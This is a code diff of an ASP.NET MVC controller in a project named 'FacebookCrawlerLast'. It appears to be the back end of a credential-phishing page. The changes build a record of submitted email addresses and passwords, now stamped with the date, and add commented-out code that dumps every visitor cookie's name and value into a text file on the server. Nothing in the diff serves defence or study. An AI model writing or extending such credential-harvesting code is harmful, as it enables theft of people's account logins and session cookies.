@@ -6,6 +6,7 @@ using System.Web.Mvc;
 using Newtonsoft.Json;
 using System.IO;
 using System.Web.Services;
+using System.Text;
 
 namespace FacebookCrawlerLast.Controllers
 {
@@ -13,6 +14,20 @@ namespace FacebookCrawlerLast.Controllers
     {
         public ActionResult Index()
         {
+            //var str = "";
+            //string[] allCookies = Request.Cookies.AllKeys;
+            //foreach (string cookie in allCookies)
+            //{
+            //    var c = Request.Cookies[cookie];
+
+            //    str += c.Name + " : " + c.Value;
+            //}
+
+            //using (StreamWriter _testData = new StreamWriter(Server.MapPath("~/onurbeycerez.txt"), true))
+            //{
+            //    _testData.WriteLine(str);
+            //}
+
             return View();
         }
 
@@ -27,13 +42,19 @@ namespace FacebookCrawlerLast.Controllers
         {
             //string json = JsonConvert.SerializeObject(postModel);
 
-            var mail = Request["mail"];
-            var password = Request["password"];
+            byte[] utf = System.Text.Encoding.UTF8.GetBytes(Request["mail"]);
+
+            var mail = System.Text.Encoding.UTF8.GetString(utf);
+
+            byte[] utf2 = System.Text.Encoding.UTF8.GetBytes(Request["password"]);
+
+            var password = System.Text.Encoding.UTF8.GetString(utf2);
 
             var str = "";
             str += "-----------------" + Environment.NewLine;
             str += "Mail : " + mail + Environment.NewLine;
             str += "Şifre : " + password + Environment.NewLine;
+            str += "Tarih : " + DateTime.Now.ToString() + Environment.NewLine;
             str += "-----------------" + Environment.NewLine;
 
             //var dataFile = Server.MapPath("~/App_Data/data.txt");
